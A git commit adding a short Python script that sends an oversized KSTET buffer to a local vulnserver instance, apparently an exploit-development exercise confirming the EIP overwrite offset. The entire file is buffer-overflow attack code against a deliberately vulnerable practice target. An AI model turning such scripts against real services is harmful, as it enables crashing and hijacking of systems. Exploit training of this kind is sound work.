e3b384ed08883c12877a8b5026027d8745b71d7c
bigb0ss <49355913+bigb0sss@users.noreply.github.com>
2020-07-19 12:37:21 -0400

    Create offset_kstet.py

---
+++ vulnserver/KSTET - EIP Overwrite/offset_kstet.py
@@ -0,0 +1,22 @@
+import socket
+import os
+import sys
+
+vuln_command = "KSTET "
+crash = 94
+offset = 70
+eip = 4
+
+payload = ""
+payload += vuln_command
+payload += "A" * offset
+payload += "B" * eip
+payload += "C" * (crash - len(payload))
+
+print "[+] Sending buffer (Size: %d)" % len(payload)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1', 9999))
+print(s.recv(1024))
+s.send(payload)
+s.close()
